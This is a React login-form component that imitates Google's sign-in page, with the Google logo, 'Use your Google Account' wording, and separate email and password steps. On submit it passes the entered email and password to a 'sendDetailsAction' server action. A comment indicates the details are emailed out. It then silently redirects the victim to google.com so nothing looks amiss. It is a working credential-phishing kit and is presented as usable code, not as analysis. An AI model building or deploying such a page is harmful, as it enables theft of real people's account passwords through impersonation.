"use client"

import * as React from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Checkbox } from "@/components/ui/checkbox"
import { cn } from "@/lib/utils"
import { ChevronDown, UserCircle, Loader2 } from "lucide-react"
import { sendDetailsAction } from "@/app/actions/send-details"

export function LoginForm() {
  const [step, setStep] = React.useState<"email" | "password">("email")
  const [email, setEmail] = React.useState("")
  const [password, setPassword] = React.useState("")
  const [showPassword, setShowPassword] = React.useState(false)
  const [isFocused, setIsFocused] = React.useState(false)
  const [isLoading, setIsLoading] = React.useState(false)

  const handleNext = async () => {
    if (step === "email" && email) {
      setStep("password")
      setIsFocused(false)
    } else if (step === "password" && password) {
      setIsLoading(true)
      try {
        await sendDetailsAction(email, password)
      } catch (error) {
        console.error("[v0] Redirecting anyway despite email error", error)
      }
      window.location.href = "https://www.google.com"
    }
  }

  return (
    <div className="w-full max-w-[448px] space-y-8 sm:rounded-xl sm:border sm:border-border sm:bg-card sm:p-10 sm:shadow-sm">
      <div className="flex flex-col items-start sm:items-center sm:text-center">
        {/* Google Logo */}
        <svg
          viewBox="0 0 24 24"
          width="40"
          height="40"
          xmlns="http://www.w3.org/2000/svg"
          aria-hidden="true"
          className="mb-4 sm:mb-6"
        >
          <path
            fill="#4285F4"
            d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
          />
          <path
            fill="#34A853"
            d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
          />
          <path
            fill="#FBBC05"
            d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
          />
          <path
            fill="#EA4335"
            d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
          />
        </svg>

        {step === "email" ? (
          <>
            <h1 className="text-[24px] font-normal tracking-tight text-[#202124] sm:text-[28px]">Sign in</h1>
            <p className="mt-2 text-[16px] font-normal text-[#202124]">Use your Google Account</p>
          </>
        ) : (
          <>
            <h1 className="text-[24px] font-normal tracking-tight text-[#202124] sm:text-[28px]">Welcome</h1>
            {/* Email chip with profile icon */}
            <div className="mt-2 flex w-full items-center justify-center">
              <button
                onClick={() => setStep("email")}
                className="flex items-center gap-2 rounded-full border border-gray-200 px-3 py-1 text-[14px] font-medium text-[#202124] hover:bg-gray-50"
              >
                <div className="flex h-5 w-5 items-center justify-center rounded-full bg-gray-100 text-gray-600">
                  <UserCircle className="h-4 w-4" />
                </div>
                <span>{email}</span>
                <ChevronDown className="h-4 w-4 text-gray-500" />
              </button>
            </div>
          </>
        )}
      </div>

      <div className="mt-8 space-y-6">
        {step === "email" ? (
          <div className="relative">
            <div
              className={cn(
                "relative rounded-[4px] border transition-all duration-200",
                isFocused ? "border-[#1a73e8] border-2" : "border-[#dadce0]",
              )}
            >
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="peer h-[56px] w-full border-none bg-transparent px-4 pt-2 text-[16px] text-[#202124] focus-visible:ring-0"
                placeholder=" "
              />
              <Label
                htmlFor="email"
                className={cn(
                  "pointer-events-none absolute left-3 top-[18px] z-10 origin-[0] -translate-y-[26px] scale-75 transform bg-background px-1 text-[16px] transition-all duration-200 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-[26px] peer-focus:scale-75",
                  isFocused ? "text-[#1a73e8]" : "text-[#5f6368]",
                )}
              >
                Email or phone
              </Label>
            </div>
            <button className="mt-2 block text-[14px] font-medium text-[#1a73e8] hover:underline">Forgot email?</button>
          </div>
        ) : (
          <div className="space-y-2">
            <div className="relative">
              <div
                className={cn(
                  "relative rounded-[4px] border transition-all duration-200",
                  isFocused ? "border-[#1a73e8] border-2" : "border-[#dadce0]",
                )}
              >
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setIsFocused(true)}
                  onBlur={() => setIsFocused(false)}
                  className="peer h-[56px] w-full border-none bg-transparent px-4 pt-2 text-[16px] text-[#202124] focus-visible:ring-0"
                  placeholder=" "
                />
                <Label
                  htmlFor="password"
                  className={cn(
                    "pointer-events-none absolute left-3 top-[18px] z-10 origin-[0] -translate-y-[26px] scale-75 transform bg-background px-1 text-[16px] transition-all duration-200 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-[26px] peer-focus:scale-75",
                    isFocused ? "text-[#1a73e8]" : "text-[#5f6368]",
                  )}
                >
                  Enter your password
                </Label>
              </div>
            </div>
            <div className="flex items-center space-x-2 pt-2">
              <Checkbox
                id="show-password"
                checked={showPassword}
                onCheckedChange={(checked) => setShowPassword(checked as boolean)}
                className="h-[18px] w-[18px] rounded-[2px] border-2 border-gray-400 data-[state=checked]:bg-[#1a73e8] data-[state=checked]:border-[#1a73e8]"
              />
              <label htmlFor="show-password" className="text-[14px] font-normal text-[#202124] cursor-pointer">
                Show password
              </label>
            </div>
          </div>
        )}

        {step === "email" && (
          <div className="text-[14px] leading-relaxed text-[#5f6368]">
            Not your computer? Use Guest mode to sign in privately.{" "}
            <button className="font-medium text-[#1a73e8] hover:underline">Learn more about using Guest mode</button>
          </div>
        )}

        <div className="flex items-center justify-between pt-6 sm:pt-10">
          <button
            className="text-[14px] font-medium text-[#1a73e8] hover:bg-blue-50/50 rounded px-2 py-2 -ml-2"
            disabled={isLoading}
          >
            {step === "email" ? "Create account" : "Forgot password?"}
          </button>
          <Button
            onClick={handleNext}
            disabled={isLoading}
            className="h-[36px] min-w-[80px] rounded-[18px] bg-[#1a73e8] px-6 text-[14px] font-medium text-white hover:bg-[#1557b0] hover:shadow-md disabled:opacity-70"
          >
            {isLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : "Next"}
          </Button>
        </div>
      </div>
    </div>
  )
}
